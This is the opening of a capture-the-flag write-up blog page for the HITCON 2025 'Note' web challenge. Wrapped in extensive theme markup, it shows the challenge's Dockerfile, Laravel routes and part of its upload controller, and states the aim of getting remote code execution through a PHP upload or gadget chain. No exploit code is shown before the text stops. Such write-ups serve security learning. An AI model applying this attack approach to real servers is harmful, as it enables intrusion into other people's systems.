<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Hitcon 2025 Note Write Up" />
<meta property="og:locale" content="en" />
<meta name="description" content="1 2 3 4 # (...) ADD flag /flag EXPOSE 80 CMD [&quot;apache2-foreground&quot;] to get the flag, we should trigger rce cuz the flag is in /flag. btw i was working on my job so i have started to solve it a little late. and to get rce in php env, we should upload a php file or find gadget chain that leads to rce" />
<meta property="og:description" content="1 2 3 4 # (...) ADD flag /flag EXPOSE 80 CMD [&quot;apache2-foreground&quot;] to get the flag, we should trigger rce cuz the flag is in /flag. btw i was working on my job so i have started to solve it a little late. and to get rce in php env, we should upload a php file or find gadget chain that leads to rce" />
<link rel="canonical" href="http://localhost:4000/posts/Hitcon-CTF-2025/" />
<meta property="og:url" content="http://localhost:4000/posts/Hitcon-CTF-2025/" />
<meta property="og:site_name" content="Web2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-08-24T09:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hitcon 2025 Note Write Up" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-08-24T09:00:00+09:00","datePublished":"2025-08-24T09:00:00+09:00","description":"1 2 3 4 # (...) ADD flag /flag EXPOSE 80 CMD [&quot;apache2-foreground&quot;] to get the flag, we should trigger rce cuz the flag is in /flag. btw i was working on my job so i have started to solve it a little late. and to get rce in php env, we should upload a php file or find gadget chain that leads to rce","headline":"Hitcon 2025 Note Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Hitcon-CTF-2025/"},"url":"http://localhost:4000/posts/Hitcon-CTF-2025/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hitcon 2025 Note Write Up | Web2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web2.0">
<meta name="application-name" content="Web2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">


  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
  <style>
  hr {
    background:white;
    height:1px;
    border:0;
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
    border: 1px solid var(--color__border-l1);
    border-radius: 4px;
    background-color: var(--color__bg-l1);
    display: flex;
    flex-direction: column;
    padding: 1rem;
    cursor: pointer
}

:root,:root.dark {
    --color__label-red: #ed2360;
    --color__label-yellow: #ffd330;
    --color__label-green: #17a05a;
    --color__label-blue: #2d20e2;
    --color__label-purple: #7549ff;
    --color__label-cyan: #18b4f8;
    --color__text-primary: #e6e6e6;
    --color__text-secondary: #adabb2;
    --color__text-tertiary: #8d8a99;
    --color__text-disabled: #6b6680;
    --color__text-yellow: #ffe878;
    --color__text-destructive: #ff6a8c;
    --color__text-primary-inv: #3f3c4f;
    --color__bg-l0: #1a1825;
    --color__bg-l1: #22202d;
    --color__bg-l2: #2e2b3b;
    --color__bg-l3: #3a3649;
    --color__bg-sidebar: #22202d;
    --color__bg-main: #1a1825;
    --color__bg-hover-l0: #1e1c2b;
    --color__bg-hover-l1: #272432;
    --color__bg-hover-l2: #332f41;
    --color__bg-l0-inv: #fff;
    --color__border-l0: #322f3f;
    --color__border-l1: #322f3f;
    --color__border-l2: #403c4d;
    --color__border-l3: #4f4c5f;
    --color__border-tertiary: rgba(208,204,255,.059);
    --color__overlay: #110f19;
    --font-size__header-xl: 1.625rem;
    --font-size__header-lg: 1.5rem;
    --font-size__header-md: 1.375rem;
    --font-size__header-sm: 1.25rem;
    --font-size__core-copy: 1.125rem;
    --font-size__lg: 1.063rem;
    --font-size__md: 0.938rem;
    --font-size__sm: 0.813rem;
    --color__alert-warning-text: #ebfcff;
    --color__alert-warning-text-secondary: #a1e6ff;
    --color__alert-warning-bg: #052947;
    --color__alert-warning-border: #085f96;
    --color__alert-error-text: #fff0f2;
    --color__alert-error-text-secondary: #ffcbd5;
    --color__alert-error-bg: #650126;
    --color__alert-error-border: #c70948
}
@media(prefers-reduced-motion:no-preference) {
    a {
        transition: color .2s ease-in-out
    }
}
.core-app-profile__bodybottom {
	width:100%;
	order:3;
	display:flex;
	flex-direction:column;
	gap:2rem
}

.profile--audithistory--loadmore {
	text-align:center
}
.profile--audithistory--loadmore hr {
	height:2px;
	background:#7549ff
}
.profile--audithistory--loadmore button {
	color:#fff;
	font-size:16px;
	width:max-content;
	margin:5px auto;
	display:flex;
	flex-direction:row;
	gap:5px;
	justify-content:center;
	align-items:center;
	cursor:pointer
}
.profile--audithistory--loadmore button svg {
	width:16px;
	height:16px
}
.profile--audithistory--loadmore button svg path {
	fill:#7549ff
}
.profile--audithistory--loadmore .audithistory--unavailable {
	margin-top:1rem;
	border:2px solid #2e2b3b;
	border-radius:.25rem;
	padding:1rem
}
.profile--audithistory--loadmore .audithistory--unavailable p {
	font-size:.875rem;
	line-height:1.125rem;
	text-align:start
}
.profile--audithistory--loadmore .audithistory--unavailable p strong {
	color:#fff
}
.profile--audithistory--auditsponsorimg {
	min-width:50px;
	min-height:50px;
	max-width:50px;
	max-height:50px;
	border-radius:50%
}
.profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	left:-15px;
	align-items:flex-end
}
.profile--audithistory--auditheading--date {
	font-size:14px;
	line-height:18px
}
.profile--audithistory--auditheading--title {
	font-size:20px;
	line-height:24px;
	color:#fff
}
.profile--audithistory--monthwrapper {
	margin-top:30px
}
.profile--audithistory--auditwrapper {
	position:relative;
	height:auto;
	margin:10px 0 30px 15px
}
.profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	margin-bottom:25px
}
.profile--audithistory--heading p {
	font-size:18px;
	color:#fff;
	white-space:nowrap
}
.profile--audithistory--heading hr {
	border:1px solid #2e2b3b;
	width:100%;
	height:1px
}
.profile--auditseverity {
	position:relative
}
.profile--auditseverity--lineconnector {
	position:relative;
	left:9px;
	min-height:15px;
	width:.5px;
	background-color:#2e2b3b
}
.profile--auditseverity--lineconnector:last-of-type {
	position:absolute;
	bottom:0
}
.profile--auditseverity--ring {
	width:25px;
	height:25px;
	border-radius:50%;
	display:flex;
	align-items:center;
	justify-content:center;
	position:relative;
	left:-3px
}
.profile--auditseverity--ring--inner {
	border-radius:50%;
	width:5px;
	height:5px;
	background:#fff
}
.profile--auditseverity--severity {
	position:relative;
	display:flex;
	margin-left:45px;
	top:-24px
}
.profile--auditseverity--severity--heading {
	color:var(--color__text-primary)
}
.profile--auditseverity--severity--content {
	margin-left:8px
}
.profile--auditseverity--severity--content--flexwrapper {
	display:flex;
	column-gap:8px;
	row-gap:5px;
	align-items:center;
	flex-wrap:wrap;
	margin-bottom:5px
}
.profile--auditseverity--severity--decorator {
	min-width:4px;
	max-width:4px;
	height:auto
}
.profile--auditseverity--severity--locked {
	font-size:12px;
	display:flex;
	gap:5px;
	flex-direction:row;
	justify-content:flex-start;
	align-items:center
}
.profile--auditseverity--severity--title {
	color:#fff;
	font-weight:semibold;
	overflow-wrap:anywhere
}
.core-app-profile--audithistory--monthwrapper {
	margin-top:40px;
	display:flex;
	flex-direction:column;
	gap:1rem
}
.core-app-profile--audithistory--monthwrapper:first-child {
	margin-top:0
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
	border-radius:4px;
	background-color:var(--color__bg-l1);
	display:flex;
	flex-direction:column;
	padding:1rem;
	cursor:pointer
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center;
	justify-content:space-between
}
.core-app-profile--audithistory--content-wrapper {
	
	flex:1 1;
	position:relative;
	display:flex;
	flex-direction:column;
	gap:14px
}
@media(min-width:450px) {
	.core-app-profile--audithistory--content-wrapper {
		flex-direction:row;
		align-items:center;
		justify-content:space-between
	}
}
.core-app-profile--audithistory--header-wrapper {
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center
}
.core-app-profile--audithistory--title {
	font-size:20px;
	line-height:24px;
	font-weight:700;
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--date {
  text-overflow:ellipsis
	white-space:nowrap
}
.core-app-profile--audithistory--wrapper {
	display:flex;
	flex-direction:column-reverse;
	height:100%
}
  </style>

  <!-- A placeholder to allow defining custom metadata -->

  <script src="https://code4rena.com/_next/static/chunks/app/%5B@username%5D/page-20c23029062acd7f.js"></script>
</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/ant.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web2.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Amennnn</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <li class="nav-item">
          <a href="https://evm.pics" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i><span>ABOUT</span>
          </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://blockscan.com/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    style="background-color:#030014"
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Hitcon 2025 Note Write Up</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Hitcon 2025 Note Write Up</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1755993600"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 24, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://x.com/l0ptus">anonymous</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="1471 words"
>
  <em>8 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <div class="language-docker highlighter-rouge"><div class="code-header">
        <span data-label-text="Docker"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="c"># (...)</span>
<span class="k">ADD</span><span class="s"> flag /flag</span>
<span class="k">EXPOSE</span><span class="s"> 80</span>
<span class="k">CMD</span><span class="s"> ["apache2-foreground"]</span>
</pre></td></tr></tbody></table></code></div></div>
<p>to get the flag, we should trigger rce cuz the flag is in /flag. btw i was working on my job so i have started to solve it a little late. and to get rce in php env, we should upload a php file or find gadget chain that leads to rce</p>

<h2 id="routers-and-middleware"><span class="me-2">routers and middleware</span><a href="#routers-and-middleware" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kn">use</span> <span class="nc">Illuminate\Support\Facades\Route</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">App\Http\Controllers\AuthController</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Illuminate\Http\Request</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">App\Http\Middleware\DangerousWordFilter</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">App\Http\Controllers\FileController</span><span class="p">;</span>

<span class="nc">Route</span><span class="o">::</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/register'</span><span class="p">,</span> <span class="p">[</span><span class="nc">AuthController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'register'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">middleware</span><span class="p">(</span><span class="nc">DangerousWordFilter</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>
<span class="nc">Route</span><span class="o">::</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span>    <span class="p">[</span><span class="nc">AuthController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'login'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">middleware</span><span class="p">(</span><span class="nc">DangerousWordFilter</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>

<span class="c1">// New public route for serving admin files</span>
<span class="nc">Route</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/announcement/{filename}'</span><span class="p">,</span> <span class="p">[</span><span class="nc">FileController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'servePublicAdminFile'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">where</span><span class="p">(</span><span class="s1">'filename'</span><span class="p">,</span> <span class="s1">'.*'</span><span class="p">);</span>
<span class="nc">Route</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/announcements'</span><span class="p">,</span> <span class="p">[</span><span class="nc">FileController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'serveAllPublicAdminFile'</span><span class="p">]);</span>

<span class="nc">Route</span><span class="o">::</span><span class="nf">middleware</span><span class="p">(</span><span class="s1">'auth:sanctum'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">group</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/logout'</span><span class="p">,</span> <span class="p">[</span><span class="nc">AuthController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'logout'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">middleware</span><span class="p">(</span><span class="nc">DangerousWordFilter</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/user'</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">user</span><span class="p">();</span>
    <span class="p">})</span><span class="o">-&gt;</span><span class="nf">middleware</span><span class="p">(</span><span class="nc">DangerousWordFilter</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>

    <span class="c1">// File Upload and Download Routes</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/upload'</span><span class="p">,</span> <span class="p">[</span><span class="nc">FileController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'upload'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">middleware</span><span class="p">(</span><span class="nc">DangerousWordFilter</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/download/{filename}'</span><span class="p">,</span> <span class="p">[</span><span class="nc">FileController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'download'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">middleware</span><span class="p">(</span><span class="nc">DangerousWordFilter</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="s1">'/files'</span><span class="p">,</span> <span class="p">[</span><span class="nc">FileController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'getAllFiles'</span><span class="p">]);</span>

    <span class="c1">// Admin command execution</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/admin/testFile'</span><span class="p">,</span> <span class="p">[</span><span class="nc">\App\Http\Controllers\AdminController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'testFile'</span><span class="p">]);</span>
    <span class="nc">Route</span><span class="o">::</span><span class="nf">post</span><span class="p">(</span><span class="s1">'/admin/report'</span><span class="p">,</span> <span class="p">[</span><span class="nc">\App\Http\Controllers\AdminController</span><span class="o">::</span><span class="n">class</span><span class="p">,</span> <span class="s1">'report'</span><span class="p">])</span><span class="o">-&gt;</span><span class="nf">middleware</span><span class="p">(</span><span class="nc">DangerousWordFilter</span><span class="o">::</span><span class="n">class</span><span class="p">);</span>

<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>
<p>this service is built with laravel and exposes the following routes: /login, /register, /upload, /download, /files, /admin/report, and /admin/testfile and etc</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre></td><td class="rouge-code"><pre>
    <span class="k">public</span> <span class="k">function</span> <span class="n">upload</span><span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">validate</span><span class="p">([</span>
            <span class="s1">'file'</span> <span class="o">=&gt;</span> <span class="s1">'required|file|max:5'</span><span class="p">,</span> <span class="c1">// Max 10MB file size</span>
        <span class="p">]);</span>

        <span class="nv">$user</span> <span class="o">=</span> <span class="nc">Auth</span><span class="o">::</span><span class="nf">user</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">response</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">json</span><span class="p">([</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'Unauthenticated.'</span><span class="p">],</span> <span class="mi">401</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// Sanitize username</span>
        <span class="nv">$username</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">);</span> <span class="c1">// Ensure no path traversal in username</span>

        <span class="c1">// Determine disk and path based on admin status</span>
        <span class="nv">$disk</span> <span class="o">=</span> <span class="s1">'local'</span><span class="p">;</span>
        <span class="nv">$basePath</span> <span class="o">=</span> <span class="s1">'uploads/'</span> <span class="mf">.</span> <span class="nv">$username</span><span class="p">;</span>
        <span class="nv">$publicUrl</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span> <span class="c1">// To store the public URL if applicable</span>
        <span class="c1">// Assuming 'is_admin' property exists on the User model</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">===</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$disk</span> <span class="o">=</span> <span class="s1">'local'</span><span class="p">;</span> <span class="c1">// Corrected disk for admin</span>
            <span class="nv">$basePath</span> <span class="o">=</span> <span class="s1">'admin/'</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nc">Storage</span><span class="o">::</span><span class="nf">disk</span><span class="p">(</span><span class="nv">$disk</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">exists</span><span class="p">(</span><span class="nv">$basePath</span><span class="p">))</span> <span class="p">{</span>
            <span class="nc">Storage</span><span class="o">::</span><span class="nf">disk</span><span class="p">(</span><span class="nv">$disk</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">makeDirectory</span><span class="p">(</span><span class="nv">$basePath</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$filePath</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="nb">file</span><span class="p">(</span><span class="s1">'file'</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">store</span><span class="p">(</span><span class="nv">$basePath</span><span class="p">);</span> <span class="c1">// Corrected storeAs parameter</span>

